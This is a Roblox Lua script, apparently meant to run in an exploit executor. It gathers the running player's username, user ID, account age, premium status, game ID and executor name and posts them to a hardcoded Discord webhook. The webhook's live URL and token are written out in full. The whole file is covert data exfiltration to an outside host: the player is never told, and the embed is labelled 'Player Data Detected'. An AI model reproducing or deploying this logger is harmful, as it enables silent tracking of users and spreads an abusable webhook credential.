local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1309717091552727101/F2uLO0_SAWt2JspQ-pX6mPAmgp6wDJTiN5ZyRGD3-gka22qwzpX3DvPZ5H9geYZOz9ml"

local function getPlayerData()
    local playerData = {
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        accountAge = LocalPlayer.AccountAge, -- In days
        premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "✅ Premium" or "❌ Not Premium",
        game = game.PlaceId,
        executor = identifyexecutor and identifyexecutor() or "❓ Unknown",
        avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
    }
    return playerData
end

local function sendWebhook(data)
    local embed = {
        title = "🕵️ Player Data Detected",
        description = "**Player Details**",
        fields = {
            { name = "🧑 Username", value = data.username, inline = true },
            { name = "🆔 UserID", value = tostring(data.userId), inline = true },
            { name = "📅 Account Age (days)", value = tostring(data.accountAge), inline = true },
            { name = "💎 Premium", value = data.premium, inline = true },
            { name = "🎮 Game ID", value = tostring(data.game), inline = true },
            { name = "⚙️ Executor", value = data.executor, inline = true }
        },
        color = tonumber(0x00FF00),
        thumbnail = {
            url = data.avatarUrl
        }
    }

    local payload = HttpService:JSONEncode({
        content = "🚨 **Player Data Sent!**",
        embeds = { embed }
    })

    HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
end

local success, errorMessage = pcall(function()
    local playerData = getPlayerData()
    sendWebhook(playerData)
end)

if not success then
    warn("Failed to send Webhook: " .. errorMessage)
end
